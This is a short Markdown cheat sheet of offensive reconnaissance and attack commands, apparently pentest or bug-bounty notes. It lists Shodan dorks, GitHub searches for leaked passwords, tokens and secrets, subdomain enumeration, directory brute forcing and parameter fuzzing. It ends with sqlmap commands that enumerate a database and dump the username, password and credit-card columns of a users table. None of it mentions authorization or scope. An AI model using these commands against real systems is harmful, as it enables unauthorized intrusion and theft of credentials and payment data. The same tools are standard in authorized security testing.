
# Recon

## Shodan

ssl:"domain.com"

Ssl.cert.subject.CN:"domain.com"200

http.title:"domain.com"200

## Github

domain.com password / pwd / token / secret / client-secret / passwd

## Subdomain Enumeration

### Sublist3r

```
python sublist3r.py -d example.com
```

### assetfinder

```
assetfinder --subs-only domain.com
```

### To filter subs results use httpx

```
cat subs.txt | httpx -silent -fc 404,403,401,307 > newsubs.txt
```



# Directory Brute Force

### dirsearch

```
python3 dirsearch.py -u https://target.com
```

### dirb 

```
dirb https://domain.com/ /usr/share/wordlists/dirb/common.txt
```

## gobuster

```
gobuster -e -u http://domain.com/ -w /usr/share/wordlists/dirb/common.txt
```

# Fuzzing

## ParamSpider

```
python3 paramspider.py --domain domain.com
```
## Waybackurl

```
cat domains.txt | waybackurls > urls
```
## ffuf

```
ffuf -w /home/kali/Downloads/WordList-main/fuzz.txt -u https://target/FUZZ
```

# SQLmap

```
sqlmap -r file.txt --batch --level 5 --risk 3 --dbs
sqlmap --url ""
sqlmap --url "" -D (db_name) --tables
sqlmap --url "" -D (db_name) -T (users) --columns
sqlmap --url "" -D (db_name) -T (users) -C (uname,pass,cc) --dump
sqlmap --url "" --current-user
```
